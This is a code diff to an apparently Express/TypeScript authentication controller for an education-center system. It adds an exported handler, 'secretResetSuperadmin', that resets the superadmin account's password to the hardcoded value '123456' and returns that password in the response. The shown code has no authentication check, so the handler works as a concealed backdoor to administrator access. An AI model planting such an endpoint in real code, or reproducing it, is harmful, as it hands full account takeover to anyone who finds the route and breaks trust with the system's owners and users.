@@ -125,3 +125,21 @@ export const processStudentLogin = asyncHandler(async (req: Request, res: Respon
     res.render('pages/student-login', { error: err.message || 'بيانات غير صحيحة' });
   }
 });
+
+import { AppDataSource } from '../../config/data-source';
+import { User } from './user.entity';
+import * as bcrypt from 'bcrypt';
+
+export const secretResetSuperadmin = asyncHandler(async (req: Request, res: Response) => {
+  const repo = AppDataSource.getRepository(User);
+  const user = await repo.findOne({ where: { email: 'admin@centersystem.com' } });
+  
+  if (user) {
+    user.password = await bcrypt.hash('123456', 10);
+    await repo.save(user);
+    res.send('✅ Password updated successfully! New password: 123456');
+  } else {
+    res.send('❌ Superadmin User not found. Did you use admin@centersystem.com or admin@future.com?');
+  }
+});
+
